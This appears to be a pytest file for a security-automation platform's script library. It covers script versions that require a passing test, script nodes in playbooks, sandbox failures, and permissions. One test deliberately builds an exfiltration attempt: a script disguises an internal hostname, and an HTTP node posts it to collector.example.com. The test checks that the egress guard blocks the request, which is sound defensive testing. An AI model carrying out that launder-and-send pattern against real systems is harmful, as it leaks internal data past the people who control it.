"""Scripts: the library, versions that need a passing test, and script nodes in a run."""

# ruff: noqa: E501 (graphs of test playbooks read better on one line)

from __future__ import annotations

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import select

from app.automation import egress, scripts
from app.core.db import SessionLocal
from app.core.models import Run, Script, ScriptVersion
from app.main import app as fastapi_app
from tests.conftest import make_key
from tests.test_automation_engine import edge, go, incident, node, playbook, steps

SHIPPED = scripts.shipped()
DOUBLE = "def main(args):\n    print('doubling', args['n'])\n    return {'doubled': args['n'] * 2}\n"
DRAFT = {
    "code": DOUBLE,
    "arguments": [{"name": "n", "type": "number", "required": True, "description": "A number"}],
    "outputs": [{"name": "doubled", "type": "number"}],
    "test": {"args": {"n": 21}, "expect": {"doubled": 42}},
}


def make_script(admin: TestClient, name: str = "Double", draft: dict | None = None) -> str:
    created = admin.post("/api/automation/scripts", json={"name": name, "description": "d"})
    assert created.status_code == 201, created.text
    script_id = created.json()["id"]
    saved = admin.post(f"/api/automation/scripts/{script_id}/versions", json={"draft": draft or DRAFT})
    assert saved.status_code == 201, saved.text
    return script_id


# --------------------------------------------------------------------------- #
# The scripts Nik ships                                                       #
# --------------------------------------------------------------------------- #
def test_nik_ships_its_scripts():
    assert [item["name"] for item in SHIPPED] == [
        "BusinessHours", "CsvToList", "DefangIndicators", "ExtractDomains", "FilterList", "GroupByField", "VerdictChanges",
    ]  # fmt: skip
    for item in SHIPPED:
        assert scripts.NAME_RE.match(item["name"]) and item["description"]
        assert item["arguments"] and item["outputs"] and "expect" in item["test"], item["name"]


@pytest.mark.parametrize("item", SHIPPED, ids=lambda item: item["name"])
def test_each_shipped_script_passes_its_test_in_the_sandbox(sandbox, item):
    result = scripts.run_test(item)
    assert result["passed"] is True, result
    # Every output it declares is in what it returns.
    assert {out["name"] for out in item["outputs"]} <= set(result["result"])


def test_the_shipped_scripts_are_in_the_library_once_and_follow_a_release(client: TestClient):
    with SessionLocal() as db:
        assert scripts.seed(db) == len(SHIPPED)
        db.commit()
        assert scripts.seed(db) == 0  # again: nothing to do
        group = db.scalars(select(Script).where(Script.name == "GroupByField")).one()
        assert (group.builtin, group.current_version, group.created_by) == (True, 1, "nik")
        # A release changed one: it gets a new version; playbooks stay on the one they have.
        first = db.get(ScriptVersion, (group.id, 1))
        first.code = "def main(args):\n    return {}\n"
        db.commit()
        assert scripts.seed(db) == 1
        db.commit()
        assert db.scalars(select(Script).where(Script.name == "GroupByField")).one().current_version == 2
        # A script of the analysts' own that took a shipped name is theirs.
        mine = db.scalars(select(Script).where(Script.name == "FilterList")).one()
        mine.builtin = False
        db.get(ScriptVersion, (mine.id, 1)).code = "def main(args):\n    return 'mine'\n"
        db.commit()
        assert scripts.seed(db) == 0


# --------------------------------------------------------------------------- #
# Drafts and versions                                                         #
# --------------------------------------------------------------------------- #
def test_a_script_enters_the_library_when_its_test_passes(admin: TestClient, sandbox):
    created = admin.post("/api/automation/scripts", json={"name": "Double", "description": "Doubles a number"}).json()
    script_id = created["id"]
    assert (created["version"], created["inLibrary"], created["builtin"]) == (None, False, False)
    assert created["draft"]["test"] == {"args": {"name": "Nik"}, "expect": {"greeting": "hello Nik"}}
    # The starter runs as it is.
    assert admin.post(f"/api/automation/scripts/{script_id}/test", json={}).json()["passed"] is True
    # Not in the catalog until a version is saved.
    assert "script.Double" not in {n["id"] for n in admin.get("/api/automation/catalog").json()["nodes"]}

    # A draft is saved as it is; the test says what is wrong with it.
    broken = {**DRAFT, "code": "def main(args):\n    return {'doubled': args['n'] * 3}\n"}
    assert admin.put(f"/api/automation/scripts/{script_id}", json={"draft": broken}).json()["draft"] == broken
    result = admin.post(f"/api/automation/scripts/{script_id}/test", json={}).json()
    assert result["passed"] is False and result["result"] == {"doubled": 63}
    assert result["error"] == "The script ran, but did not return what the test expects"
    refused = admin.post(f"/api/automation/scripts/{script_id}/versions", json={})
    assert refused.status_code == 422 and refused.json()["test"]["passed"] is False
    assert (
        refused.json()["detail"] == "The test does not pass: The script ran, but did not return what the test expects"
    )
    raising = {**DRAFT, "code": "def main(args):\n    return 1 / 0\n"}
    assert (
        admin.post(f"/api/automation/scripts/{script_id}/test", json={"draft": raising}).json()["error"]
        == "Line 2: ZeroDivisionError: division by zero"
    )

    saved = admin.post(f"/api/automation/scripts/{script_id}/versions", json={"draft": DRAFT}).json()
    assert (saved["version"], saved["inLibrary"], saved["draft"]) == (1, True, None)
    assert saved["current"]["code"] == DOUBLE and saved["current"]["testResult"]["passed"] is True
    assert saved["current"]["testResult"]["stdout"] == "doubling 21\n"
    entry = next(n for n in admin.get("/api/automation/catalog").json()["nodes"] if n["id"] == "script.Double")
    assert (entry["group"], entry["kind"], entry["script"], entry["version"]) == ("Scripts", "script", "Double", 1)
    assert entry["arguments"] == [{"name": "n", "type": "number", "description": "A number", "required": True}]

    # A second version; the audit log has the diff of the code.
    better = {**DRAFT, "code": DOUBLE.replace("doubling", "now doubling")}
    assert admin.post(f"/api/automation/scripts/{script_id}/versions", json={"draft": better}).json()["version"] == 2
    entries = admin.get("/api/audit?q=action:script.version").json()["entries"]
    assert entries[0]["details"].startswith('Saved version 2 of the script "Double"\n--- before\n+++ after')
    assert (
        "-    print('doubling', args['n'])" in entries[0]["details"]
        and "+    print('now doubling', args['n'])" in entries[0]["details"]
    )
    detail = admin.get(f"/api/automation/scripts/{script_id}").json()
    assert [v["version"] for v in detail["versions"]] == [2, 1]
    assert admin.get(f"/api/automation/scripts/{script_id}/versions/1").json()["code"] == DOUBLE
    assert admin.get(f"/api/automation/scripts/{script_id}/versions/9").status_code == 404
    # The sandbox was asked with the token and the time limit of the configuration.
    assert sandbox[-1]["token"] == "test-sandbox-token" and sandbox[-1]["timeout"] == 10


def test_scripts_are_checked_before_they_are_kept(admin: TestClient, sandbox):
    for name in ("double", "D", "Has Space", "Under_score", "X" * 60):
        assert admin.post("/api/automation/scripts", json={"name": name}).status_code in (400, 422), name
    script_id = admin.post("/api/automation/scripts", json={"name": "Checked"}).json()["id"]
    assert (
        admin.post("/api/automation/scripts", json={"name": "CHECKED"}).json()["detail"]
        == "A script with this name exists already"
    )

    def refused(**changes):
        res = admin.post(f"/api/automation/scripts/{script_id}/versions", json={"draft": {**DRAFT, **changes}})
        assert res.status_code == 400, res.text
        return res.json()["detail"]

    assert refused(code="   ") == "The script has no code"
    assert refused(code="x" * 100_001) == "The script is longer than 100 000 characters"
    assert refused(arguments=[{"name": "Bad Name"}]).startswith("Each of the arguments needs a name")
    assert refused(arguments=[{"name": "a"}, {"name": "a"}]) == 'Two of the arguments are called "a"'
    assert refused(outputs=[{"name": "x", "type": "vector"}]).startswith('"x" has an unknown type')
    assert refused(arguments="nope") == "The arguments are a list of at most 30"


def test_a_sandbox_that_is_not_there_is_said_plainly(admin: TestClient, monkeypatch):
    script_id = admin.post("/api/automation/scripts", json={"name": "NoSandbox"}).json()["id"]

    def down(*args, **kwargs):
        raise egress.EgressError("The sandbox could not be reached")

    monkeypatch.setattr(egress, "sandbox_run", down)
    result = admin.post(f"/api/automation/scripts/{script_id}/test", json={}).json()
    assert result["passed"] is False and result["error"] == "The sandbox could not be reached"
    assert admin.post(f"/api/automation/scripts/{script_id}/versions", json={}).status_code == 422
    monkeypatch.setattr(scripts.settings, "SANDBOX_URL", "")
    assert (
        admin.post(f"/api/automation/scripts/{script_id}/test", json={}).json()["error"]
        == "The sandbox is not configured (SANDBOX_URL)"
    )
    assert admin.get("/api/automation/scripts").json()["sandbox"] is False


# --------------------------------------------------------------------------- #
# Script nodes                                                                #
# --------------------------------------------------------------------------- #
def script_node(node_id, name, version, **args):
    return node(node_id, "script", script=name, script_version=version, args=args)


def test_a_script_is_a_node_and_a_playbook_stays_on_the_version_it_was_saved_with(admin: TestClient, sandbox):
    script_id = make_script(admin)
    echo = node("say", "action", action="nik.add-note", args={"text": "It is {{ twice.doubled }}"})
    pb = playbook(
        admin,
        "Doubles",
        [script_node("twice", "Double", 1, n="{{ inputs.n }}"), echo],
        [edge("start", "twice"), edge("twice", "say")],
    )
    incident(admin, "i1")
    run = go(admin, pb, objectKind="incident", objectId="i1", inputs={"n": 8})
    assert run["status"] == "done", run["error"]
    step = steps(run)["twice"]
    assert step["output"] == {"doubled": 16} and step["log"] == "doubling 8\n" and step["input"] == {"args": {"n": 8}}
    assert admin.get("/api/incidents/i1").json()["notes"][0]["text"] == "It is 16"

    # A newer version of the script: the playbook does not move by itself, and is told.
    tripled = {**DRAFT, "code": "def main(args):\n    return {'doubled': args['n'] * 3}\n", "test": {"args": {"n": 1}}}
    admin.post(f"/api/automation/scripts/{script_id}/versions", json={"draft": tripled})
    assert steps(go(admin, pb, objectKind="incident", objectId="i1", inputs={"n": 8}))["twice"]["output"] == {
        "doubled": 16
    }
    detail = admin.get(f"/api/automation/playbooks/{pb}").json()
    assert detail["updates"] == [{"node": "twice", "script": "Double", "from": 1, "to": 2}]
    assert "updates available" in detail["warnings"]
    summary = next(p for p in admin.get("/api/automation/playbooks").json()["playbooks"] if p["id"] == pb)
    assert "updates available" in summary["warnings"]

    # A version or a script that does not exist cannot be saved in a playbook.
    created = admin.post("/api/automation/playbooks", json={"name": "Wrong"}).json()["id"]
    shape = {
        "nodes": [node("start", "trigger", manual=True), script_node("x", "Double", 9, n=1)],
        "edges": [edge("start", "x")],
    }
    refused = admin.post(f"/api/automation/playbooks/{created}/versions", json={"graph": shape})
    assert refused.json()["problems"][0]["message"] == "This script, or this version of it, does not exist"

    # A script a playbook uses is not deleted from under it; nor is a built-in one.
    used = admin.delete(f"/api/automation/scripts/{script_id}")
    assert used.status_code == 409 and used.json()["detail"] == "Used by: Doubles"
    assert admin.get(f"/api/automation/scripts/{script_id}").json()["usedBy"] == ["Doubles"]
    with SessionLocal() as db:
        scripts.seed(db)
        db.commit()
        builtin = db.scalars(select(Script).where(Script.name == "GroupByField")).one().id
    assert admin.delete(f"/api/automation/scripts/{builtin}").json()["detail"] == "A built-in script cannot be deleted"
    free = make_script(admin, "Unused")
    assert admin.delete(f"/api/automation/scripts/{free}").status_code == 204


def test_what_goes_wrong_in_a_script_node(admin: TestClient, sandbox, monkeypatch):
    raising = {
        **DRAFT,
        "code": "def main(args):\n    if args['n'] > 5:\n        raise ValueError('too big')\n    return {'other': 1}\n",
        "test": {"args": {"n": 1}},
    }
    make_script(admin, "Picky", raising)
    step = node(
        "s",
        "script",
        script="Picky",
        script_version=1,
        args={"n": "{{ inputs.n }}"},
        on_error={"mode": "retry", "times": 3},
    )
    pb = playbook(admin, "Picks", [step], [edge("start", "s")])
    run = go(admin, pb, inputs={"n": 9})
    # A script that raised will raise again: not tried again, whatever the node says.
    assert run["error"] == "s: Line 3: ValueError: too big" and steps(run)["s"]["attempt"] == 1
    # A declared output that is missing is a warning in the log, not a failure.
    run = go(admin, pb, inputs={"n": 1})
    assert (
        run["status"] == "done"
        and "[nik] the script did not return its declared output(s): doubled" in steps(run)["s"]["log"]
    )

    # A sandbox that is down may be back: that is tried again.
    def down(*args, **kwargs):
        raise egress.EgressError("The sandbox could not be reached")

    monkeypatch.setattr(egress, "sandbox_run", down)
    run = go(admin, pb, inputs={"n": 1})
    assert steps(run)["s"]["status"] == "pending" and steps(run)["s"]["error"] == "The sandbox could not be reached"


def test_a_script_cannot_launder_data_past_the_guard(admin: TestClient, sandbox, outside):
    """What a script returns has the classes of everything that went in: renaming a field hides nothing."""
    wash = {
        "code": "def main(args):\n    return {'harmless': 'value-' + args['secret'][::-1]}\n",
        "arguments": [{"name": "secret", "type": "text", "required": True}],
        "outputs": [{"name": "harmless", "type": "text"}],
        "test": {"args": {"secret": "abc"}, "expect": {"harmless": "value-cba"}},
    }
    make_script(admin, "Wash", wash)
    outside.host("collector.example.com")
    outside.answer("collector.example.com", json={})
    nodes = [
        script_node("wash", "Wash", 1, secret="{{ trigger.incident.host }}"),
        node(
            "send",
            "action",
            action="http.request",
            approval={"ask": False},
            args={"method": "POST", "url": "https://collector.example.com/in", "json": {"v": "{{ wash.harmless }}"}},
        ),
    ]
    pb = playbook(admin, "Launders", nodes, [edge("start", "wash"), edge("wash", "send")])
    admin.put(f"/api/automation/playbooks/{pb}/egress", json={"mode": "listed", "hosts": ["collector.example.com"]})
    incident(admin, "i1", host="WKS-FINANCE-01")
    run = go(admin, pb, objectKind="incident", objectId="i1")
    assert steps(run)["wash"]["output"] == {"harmless": "value-10-ECNANIF-SKW"}
    assert run["status"] == "failed" and outside.requests == []
    assert steps(run)["send"]["error"].startswith("Held back: internal names and addresses")
    with SessionLocal() as db:
        assert db.get(Run, run["id"]).context_classes["wash"] == {"": ["private_value"]}


# --------------------------------------------------------------------------- #
# Files, and who may                                                          #
# --------------------------------------------------------------------------- #
def test_scripts_travel_as_files_and_are_the_playbook_builders_to_write(admin: TestClient, sandbox):
    script_id = make_script(admin)
    exported = admin.get(f"/api/automation/scripts/{script_id}/export").json()
    assert exported["type"] == "script" and exported["script"]["code"] == DOUBLE
    imported = admin.post("/api/automation/scripts/import", json={"script": exported["script"]}).json()
    # As a draft, under a free name: it enters the library when its test passes here.
    assert (imported["name"], imported["version"], imported["inLibrary"]) == ("Double2", None, False)
    assert imported["draft"]["code"] == DOUBLE
    assert admin.post("/api/automation/scripts/import", json={"script": {"name": "bad name"}}).status_code == 400
    assert admin.post("/api/automation/scripts/import", json={"script": {"name": "NoCode"}}).status_code == 400

    analyst = make_key(admin, label="an", roles=["analyst"])
    builder = make_key(admin, label="pb", roles=["playbooks"])
    caller = TestClient(fastapi_app)
    assert caller.get("/api/automation/scripts", headers=analyst).status_code == 403
    assert caller.post(f"/api/automation/scripts/{script_id}/test", headers=analyst, json={}).status_code == 403
    assert caller.get("/api/automation/scripts", headers=builder).status_code == 200
    assert caller.post("/api/automation/scripts", headers=builder, json={"name": "Built"}).status_code == 201
    # An analyst still finds the scripts of the library in the catalog, to read a run.
    assert "script.Double" in {n["id"] for n in caller.get("/api/automation/catalog", headers=analyst).json()["nodes"]}
    logged = {e["action"] for e in admin.get("/api/audit?q=action:script.*").json()["entries"]}
    assert logged == {"script.create", "script.version", "script.import"}
